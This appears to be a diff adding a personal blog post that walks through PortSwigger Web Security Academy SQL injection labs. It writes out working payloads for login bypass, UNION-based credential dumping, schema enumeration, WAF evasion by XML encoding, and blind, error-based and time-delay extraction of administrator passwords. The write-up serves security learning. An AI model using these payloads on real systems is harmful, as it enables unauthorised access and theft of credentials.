@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Muhammadsaid Alizada</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+  </head>
+
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SQL Injections - Web Sec academy labs</title>
+    <style>
+      :root {
+        --text-color: #333;
+        --accent-color: #2962FF;
+        --background-color: #fff;
+        --card-color: #f8f9fa;
+        --border-color: #e0e0e0;
+        --meta-color: #666;
+      }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        line-height: 1.6;
+        color: var(--text-color);
+        background-color: var(--background-color);
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 40px 20px;
+      }
+
+      header {
+        margin-bottom: 2.5em;
+      }
+
+      h1 {
+        font-size: 2.2em;
+        margin-bottom: 0.3em;
+        font-weight: 600;
+      }
+
+      .contact-info {
+        margin: 0.8em 0;
+        color: var(--meta-color);
+      }
+
+      .contact-info a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .contact-info a:hover {
+        text-decoration: underline;
+      }
+
+      .contact-info span {
+        margin: 0 8px;
+        color: var(--border-color);
+      }
+
+      nav {
+        margin: 1.8em 0;
+      }
+
+      nav a {
+        margin-right: 20px;
+        text-decoration: none;
+        color: var(--text-color);
+        font-weight: 500;
+        position: relative;
+      }
+
+      nav a:hover {
+        color: var(--accent-color);
+      }
+
+      nav a:after {
+        content: '';
+        position: absolute;
+        width: 0;
+        height: 2px;
+        bottom: -4px;
+        left: 0;
+        background-color: var(--accent-color);
+        transition: width 0.3s ease;
+      }
+
+      nav a:hover:after {
+        width: 100%;
+      }
+
+      .header-divider {
+        border: 0;
+        height: 1px;
+        background: var(--border-color);
+        margin: 1.5em 0;
+      }
+
+      .post-container {
+        background: var(--card-color);
+        border-radius: 8px;
+        padding: 2.5em;
+        margin-bottom: 3em;
+        border: 1px solid var(--border-color);
+      }
+
+      .post-title {
+        margin-top: 0;
+        font-size: 1.8em;
+      }
+
+      .post-meta {
+        color: var(--meta-color);
+        font-size: 0.9em;
+        margin-bottom: 1.5em;
+      }
+
+      .post-divider {
+        border: none;
+        height: 1px;
+        background: var(--border-color);
+        margin: 2em 0;
+      }
+
+      .post-content {
+        line-height: 1.7;
+      }
+
+      .post-content a {
+        color: var(--accent-color);
+        text-decoration: none;
+      }
+
+      .post-content a:hover {
+        text-decoration: underline;
+      }
+
+      .post-content code {
+        font-family: 'Fira Code', monospace;
+        background: rgba(0,0,0,0.05);
+        padding: 0.2em 0.4em;
+        border-radius: 3px;
+        font-size: 0.9em;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre {
+        background: rgba(0,0,0,0.05);
+        padding: 1em;
+        border-radius: 5px;
+        overflow-x: auto;
+        border: 1px solid rgba(0,0,0,0.1);
+      }
+
+      .post-content pre code {
+        background: none;
+        padding: 0;
+        border: none;
+      }
+
+      .back-link {
+        color: var(--accent-color);
+        text-decoration: none;
+        font-weight: 500;
+        display: inline-block;
+        margin-top: 1em;
+      }
+
+      .back-link:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 30px 15px;
+        }
+        
+        .post-container {
+          padding: 1.5em;
+        }
+        
+        nav a {
+          margin-right: 15px;
+        }
+      }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <div class="container">
+    <header>
+  <div class="header-name-container">
+    <img src="http://localhost:4321/assets/i.jpeg" alt="Muhammadsaid Alizada" class="profile-photo">
+    <h1>Muhammadsaid Alizada</h1>
+  </div>
+  
+  <div class="contact-info">
+    <a href="mailto:ma8494@nyu.edu">ma8494@nyu.edu</a>
+    <span>|</span>
+    <a href="https://github.com/MSaidAlizada" target="_blank">GitHub</a>
+    <span>|</span>
+    <a href="https://www.linkedin.com/in/muhammadsaid-alizada/" target="_blank">LinkedIn</a>
+  </div>
+  
+  <nav>
+    <a href="http://localhost:4321/">home</a>
+    <a href="http://localhost:4321/posts">posts</a>
+    <a href="http://localhost:4321/notes">notes</a>
+    <a href="http://localhost:4321/assets/CV.pdf">cv</a>
+    <a href="mailto:ma8494@nyu.edu">contact</a>
+  </nav>
+  
+  <hr class="header-divider">
+</header>
+
+<style>
+  .header-name-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 0.5em;
+  }
+
+  .profile-photo {
+    width: 80px;
+    height: 80px;
+    border-radius: 4px;
+    object-fit: cover;
+    border: 2px solid var(--border-color);
+  }
+
+</style>
+
+    <div class="post-container">
+      <article class="post">
+        <h1 class="post-title">SQL Injections - Web Sec academy labs</h1>
+        <p class="post-meta">Posted on February 10, 2025</p>
+        
+        <div class="post-content">
+          <p>This post will run through the labs on web sec academy by Portswigger related to SQL injections.</p>
+
+<p>SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. For example in this URL:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://insecure-website.com/products?category=Gifts
+</code></pre></div></div>
+<p>We see there is SQL query being made and it would like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+</code></pre></div></div>
+<p>By changing our query from Gifts to Gifts’– we can manipulate the query to show all Gift products as – is a comment inidicator in SQL so it disregards the released = 1. Also by adding +OR+1=1– we can get the products from all categories.</p>
+
+<h3 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><u>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</u></h3>
+<p>This lab perform a SQL injection attack that causes the application to display one or more unreleased products. So by add ‘+OR+1=1 we can cause it to show us all the products.</p>
+
+<h3 id="lab-sql-injection-vulnerability-allowing-login-bypass"><u>Lab: SQL injection vulnerability allowing login bypass</u></h3>
+<p>Some applications may login users by doing an SQl query with the entered username and password which if there is an SQLi vulnerability allows for login bypass. By entering this, administrator’ – , as our username we can bypass and login as admin.</p>
+
+<h2 id="union-attacks"><u><b>Union attacks</b></u></h2>
+<p>Using the UNION keyword we can retrieve data from other tables. For it to work there are two requirements:</p>
+<ul>
+  <li>The individual queries must return the same number of columns</li>
+  <li>The data types in each column must be compatible between the individual queries
+We can find the number of columns required injecting ‘ ORDER BY 1– and repeating till we get to the number where an error occurs. Or we could inject ‘ UNION SELECT NULL– and add more ,NULL until we don’t get an error.</li>
+</ul>
+
+<h3 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><u>Lab: SQL injection UNION attack, determining the number of columns returned by the query</u></h3>
+<p>For this lab we just use the methods shown above. I used the ‘ UNION SELECT NULL– and iterated till I didn’t get an error and that occured when I had 3 NULLs showing there is 3 columns. In other labs which may use Oracle might require every SELECT query to have FROM included which you can use FROM DUAL as dual is a built in table in Oracle.</p>
+
+<h3 id="lab-sql-injection-union-attack-finding-a-column-containing-text"><u>Lab: SQL injection UNION attack, finding a column containing text</u></h3>
+<p>Once find the number of columns we need to find which ones have useful data types. For example for the last lab we found out there are 3 columns using ‘ UNION SELECT NULL,NULL,NULL– and by going through each column and putting a string we can find if any column returns strings. Like so:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+</code></pre></div></div>
+<p>For this lab there is also three columns and using this above method we find that the second column has a data type string.</p>
+
+<h3 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables"><u>Lab: SQL injection UNION attack, retrieving data from other tables</u></h3>
+<p>We are told there is table called users with two columns, username and password. By using this injection: ?category=Gifts’ UNION SELECT username,password FROM users –<br />
+We get all the usernames and passwords where we find the admin password.</p>
+
+<h3 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"><u>Lab: SQL injection UNION attack, retrieving multiple values in a single column</u></h3>
+<p>In some cases only a single column is returned so if we want to retrieve multiple values we will need to concatenate them which we can do through using || which concatenate strings in Oracle. So for this lab we will first check how many columns there are using ‘ UNION SELECT NULL– and we find there are two columns. Now we want to find out if the columns have data type string and with this: ‘ UNION SELECT NULL,’a’– , we find the 2nd column accepts strings. Now since we have only one column which returns strings we will concatenate the username and passwords into this column with this query:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT NULL,username ||'~'|| password FROM users--
+</code></pre></div></div>
+<p>Which gets us all the usernames and passwords.</p>
+
+<h3 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft"><u>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</u></h3>
+<p>We may also need to identify the database type and version which we can do through using this table:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Database type</th>
+      <th style="text-align: left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Microsoft, MySQL  </td>
+      <td style="text-align: left">SELECT @@version</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Oracle</td>
+      <td style="text-align: left">SELECT * FROM v$version</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">PostgreSQL</td>
+      <td style="text-align: left">SELECT version()</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>For this lab we wanna check if the database type is Microsoft, MySQL which we do by using UNION to combine this query: SELECT @@version<br />
+But first we need to find the number of column being used which we find as 2 and both accept strings so using @@version we can get the version of the database. Note: For this lab since it is MySQL you will need to use # or – (with a space after) for the comment.</p>
+
+<h3 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases"><u>Lab: SQL injection attack, listing the database contents on non-Oracle databases</u></h3>
+<p>Most database types (except Oracle) have a set of views called the information schema. This provides information about the database. We can use this to get the name of the tables used in the database or query the columns in the tables. As always we first check the number of columns and we find it requies 2. With this,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT NULL,TABLE_NAME FROM information_schema.tables -- 
+</code></pre></div></div>
+<p>we can get all the table names and among them we find a table called users_hdkkde. Now we check the columns in that table with this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT COLUMN_NAME,TABLE_NAME FROM information_schema.columns WHERE table_name = 'users_hdkkde'--
+</code></pre></div></div>
+<p>We find the the two columns username_hfbhas and password_bmtgui which we can get results from using:
+‘ UNION SELECT username_hfbhas,password_bmtgui FROM users_hdkkde–</p>
+
+<h3 id="lab-sql-injection-with-filter-bypass-via-xml-encoding"><u>Lab: SQL injection with filter bypass via XML encoding</u></h3>
+<p>In this lab the SQL injection vulnerability is in its stock check feature. But there is a WAF (web application firewall) that detects our injection when we use keywords, so to bypass this we can encode our injection since it uses XML format. We can do this with hackvertor extension on Burp Suite to convert this injection:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UNION SELECT username ||'~'|| password from users
+</code></pre></div></div>
+<p>to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;#x55;&amp;#x4e;&amp;#x49;&amp;#x4f;&amp;#x4e;&amp;#x20;&amp;#x53;&amp;#x45;&amp;#x4c;&amp;#x45;&amp;#x43;&amp;#x54;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;  
+&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x20;&amp;#x7c;&amp;#x7c;&amp;#x27;&amp;#x7e;&amp;#x27;&amp;#x7c;&amp;#x7c;&amp;#x20;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;  
+&amp;#x77;&amp;#x6f;&amp;#x72;&amp;#x64;&amp;#x20;&amp;#x66;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x20;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x73;
+</code></pre></div></div>
+<p>Which will then return us the password when injected into the store Id field.</p>
+
+<h2 id="blind-sql"><u><b>Blind SQL</b></u></h2>
+<p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. If we have a query that has an effect on the website but doesn’t show the results then through injecting a condition we can extract data one piece at a time.</p>
+
+<h3 id="lab-blind-sql-injection-with-conditional-responses"><u>Lab: Blind SQL injection with conditional responses</u></h3>
+<p>In this lab there is a cookie called TrackingId which is vulnerable to a SQL injection but since we can’t directly get information from the database we will have an injection with a condition attached to the original query as such:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = &lt;letter&gt;
+</code></pre></div></div>
+<p>In this query by going through all the letters we will eventually reach one where the result is true thus the qeury will return. When it does return we notice there is a change on the web page as it says “Welcome back”. By going through all combinations we get the admin’s password: xix9ft15rj1gnru65hyu</p>
+<h3 id="lab-blind-sql-injection-with-conditional-errors"><u>Lab: Blind SQL injection with conditional errors</u></h3>
+<p>Sometimes there will be no apparent change in the application when trying to do a Blind SQLi but by inducing errors we can figure out the response. For example you can trigger a divide by zero error if the condition you set is not true using the CASE keyword.<br />
+For our lab we are told it is an Oracle database so the injection would look like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+</code></pre></div></div>
+<p>Now through iterating through all letters and positions we can get the password: t6n50gc4vfu471mp349x</p>
+
+<h3 id="lab-visible-error-based-sql-injection"><u>Lab: Visible error-based SQL injection</u></h3>
+<p>Sometimes the results from databases might have verbose error messages which can provide us information. For example in this lab by inserting a qoutation mark we can induce the following error:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'VsJltEian2Rgr93U''. Expected  char
+</code></pre></div></div>
+<p>This error shows us how the SQL query is set up in the backend. We can also use the CAST function to have the error message include data returned from a query as such:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' AND CAST((SELECT password FROM users LIMIT 1)AS int)='1
+</code></pre></div></div>
+<p>Which returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR: invalid input syntax for type integer: "jyn3ry78crkevn2z3ug4"
+</code></pre></div></div>
+
+<h3 id="lab-blind-sql-injection-with-time-delays-and-information-retrieval"><u>Lab: Blind SQL injection with time delays and information retrieval</u></h3>
+<p>In other cases when the database catches error if it handles the properly we will not be able to get responses like in the last lab. However we can still extract information by triggring time delays. Since the technique for delivering time delays is different for each database we will first have to figure out which one the lab is using. By going through each technique we figure out we can only delay using PostgreSQL:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Database</th>
+      <th>SQL Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Oracle</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'|| dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td>
+    </tr>
+    <tr>
+      <td><strong>Microsoft</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td>
+    </tr>
+    <tr>
+      <td><strong>PostgreSQL</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+    </tr>
+    <tr>
+      <td><strong>MySQL</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Now we can make our query to brute force to find out the password:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TrackingId=a'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='') AND username='administrator' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</code></pre></div></div>
+<p>And we get the password:<br />
+5vtyfcc04drr2rgnrjs7</p>
+
+        </div>
+        
+        <hr class="post-divider">
+        
+        <a href="http://localhost:4321/posts" class="back-link">← All Posts</a>
+      </article>
+    </div>
+  </div>
+</body>
+</html>
+</body>
+</html>
